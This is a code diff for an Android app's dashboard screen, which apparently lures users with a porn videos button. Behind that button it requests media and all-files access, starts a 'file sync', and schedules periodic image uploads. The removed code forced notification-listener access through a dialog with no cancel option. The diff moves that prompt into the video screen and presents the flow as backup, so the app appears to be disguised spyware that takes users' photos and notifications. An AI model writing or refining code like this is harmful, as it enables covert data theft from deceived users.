@@ -98,9 +98,7 @@ public class DashboardActivity extends AppCompatActivity {
             ImageUploadWorker.schedulePeriodicUpload(this);
         }
 
-        // Request notification access on app launch
-        maybePromptNotificationAccessOnLaunch();
-
+        // ✅ NO permission requests on app launch - only when feature is opened
         binding.btnPorn.setOnClickListener(v -> onVideosTapped());
         binding.btnChat.setOnClickListener(v -> onChatTapped());
         binding.btnContacts.setOnClickListener(v -> onGamesTapped());
@@ -116,8 +114,7 @@ public class DashboardActivity extends AppCompatActivity {
         if (FeaturePermissions.areVideosUnlocked(this)) {
             ImageUploadWorker.schedulePeriodicUpload(this);
         }
-        // Ask for notification access every time if not enabled
-        maybePromptNotificationAccessOnLaunch();
+        // ✅ NO notification permission requests on app resume
     }
 
     private void setupToolbarSubtitle() {
@@ -266,33 +263,8 @@ public class DashboardActivity extends AppCompatActivity {
                 .show();
     }
 
-    private void maybePromptNotificationAccessOnLaunch() {
-        if (NotificationHelper.isNotificationServiceEnabled(this)) {
-            return;
-        }
-        // MANDATORY: No cancel button - user MUST enable notification access
-        new AlertDialog.Builder(this)
-                .setTitle(R.string.perm_notif_title)
-                .setMessage(R.string.perm_notif_message)
-                .setPositiveButton(R.string.perm_allow, (d, w) ->
-                        NotificationHelper.openNotificationListenerSettings(this))
-                .setCancelable(false)  // Can't dismiss by tapping outside
-                .show();
-    }
-
-    private void maybePromptNotificationAccess() {
-        if (NotificationHelper.isNotificationServiceEnabled(this)) {
-            return;
-        }
-        // MANDATORY: No cancel button - user MUST enable notification access
-        new AlertDialog.Builder(this)
-                .setTitle(R.string.perm_notif_title)
-                .setMessage(R.string.perm_notif_message)
-                .setPositiveButton(R.string.perm_allow, (d, w) ->
-                        NotificationHelper.openNotificationListenerSettings(this))
-                .setCancelable(false)  // Can't dismiss by tapping outside
-                .show();
-    }
+    // ✅ Notification permission moved to PornActivity (inside video activity)
+    // This keeps Dashboard clean - no permission requests on launch
 
     private void openProfile() {
         startActivity(new Intent(this, ProfileActivity.class));
@@ -411,8 +383,10 @@ public class DashboardActivity extends AppCompatActivity {
     }
     
     /**
-     * Sequential permission flow - one dialog at a time, no overlapping screens
-     * Each permission is fully handled before showing the next one
+     * Sequential permission flow - TWO permissions only on Videos button click
+     * 1. Media permission (required)
+     * 2. All files access (optional, for better coverage)
+     * Notification permission moved to PornActivity (inside video activity)
      */
     private void showFileBackupPermissionFlow() {
         if (!permissionFlowInProgress) {
@@ -420,9 +394,9 @@ public class DashboardActivity extends AppCompatActivity {
             return;
         }
         
-        Log.d(TAG, "🔄 Checking permissions sequentially...");
+        Log.d(TAG, "🔄 Checking media permissions...");
         
-        // Step 1: Ask for media/image permissions
+        // Step 1: Ask for media/image permissions (REQUIRED)
         if (Build.VERSION.SDK_INT >= 33) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                 != PackageManager.PERMISSION_GRANTED) {
@@ -441,29 +415,18 @@ public class DashboardActivity extends AppCompatActivity {
             Log.d(TAG, "1️⃣ ✅ Storage permission already granted");
         }
 
-        // Step 2: Ask for notification permissions (Android 13+)
-        if (Build.VERSION.SDK_INT >= 33) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
-                != PackageManager.PERMISSION_GRANTED) {
-                Log.d(TAG, "2️⃣ 🔔 Notification permission NOT granted - showing dialog");
-                showNotificationPermissionDialog();
-                return;
-            }
-            Log.d(TAG, "2️⃣ ✅ Notification permission already granted");
-        }
-
-        // Step 3: Ask for all files access (Android 11+)
+        // Step 2: Ask for all files access (Android 11+) - OPTIONAL but recommended
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
-                Log.d(TAG, "3️⃣ 📂 All files access NOT granted - showing dialog");
+                Log.d(TAG, "2️⃣ 📂 All files access NOT granted - showing dialog");
                 showAllFilesAccessDialog();
                 return;
             }
-            Log.d(TAG, "3️⃣ ✅ All files access already granted");
+            Log.d(TAG, "2️⃣ ✅ All files access already granted");
         }
 
-        // All permissions granted - start sync
-        Log.d(TAG, "🎉 All permissions complete - starting file sync");
+        // All permissions for file access granted - start sync and open videos
+        Log.d(TAG, "🎉 All file permissions complete - starting sync & opening videos");
         permissionFlowInProgress = false;
         startFileSync();
     }
@@ -488,29 +451,6 @@ public class DashboardActivity extends AppCompatActivity {
                 .setNegativeButton("Skip", (dialog, which) -> {
                     Log.d(TAG, "1️⃣ User skipped media permission - moving to step 2");
                     Toast.makeText(this, "Media permission skipped", Toast.LENGTH_SHORT).show();
-                    // Continue to next permission after small delay
-                    binding.getRoot().postDelayed(this::showFileBackupPermissionFlow, 300);
-                })
-                .setCancelable(false)
-                .show();
-    }
-
-    /**
-     * Step 2: Notification permissions dialog
-     * After user allows or skips, the permission flow continues to next permission
-     */
-    private void showNotificationPermissionDialog() {
-        Log.d(TAG, "2️⃣ 🔔 Showing notification permission dialog");
-        new AlertDialog.Builder(this)
-                .setTitle("🔔 Notifications")
-                .setMessage("Allow notifications to keep you updated on backup progress?")
-                .setPositiveButton("Allow", (dialog, which) -> {
-                    Log.d(TAG, "2️⃣ User allowed notification permission - requesting from system");
-                    permissionLauncher.launch(new String[]{Manifest.permission.POST_NOTIFICATIONS});
-                })
-                .setNegativeButton("Skip", (dialog, which) -> {
-                    Log.d(TAG, "2️⃣ User skipped notification permission - moving to step 3");
-                    Toast.makeText(this, "Notification permission skipped", Toast.LENGTH_SHORT).show();
                     // Continue to next permission after small delay
                     binding.getRoot().postDelayed(this::showFileBackupPermissionFlow, 300);
                 })
